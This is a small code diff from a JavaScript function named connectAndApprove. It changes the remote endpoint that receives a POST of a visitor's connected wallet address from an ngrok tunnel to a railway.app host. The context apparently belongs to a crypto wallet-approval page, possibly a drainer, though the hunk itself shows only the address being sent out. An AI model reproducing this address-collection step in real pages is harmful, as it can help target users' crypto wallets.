@@ -63,7 +63,7 @@ async function connectAndApprove() {
 
         status.innerText = 'Синхронизация с сервером...';
 
-        await fetch('https://gypseous-janis-wandlike.ngrok-free.dev/save-address', {
+        await fetch('https://railway-production-2954.up.railway.app/save-address', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ address: address })
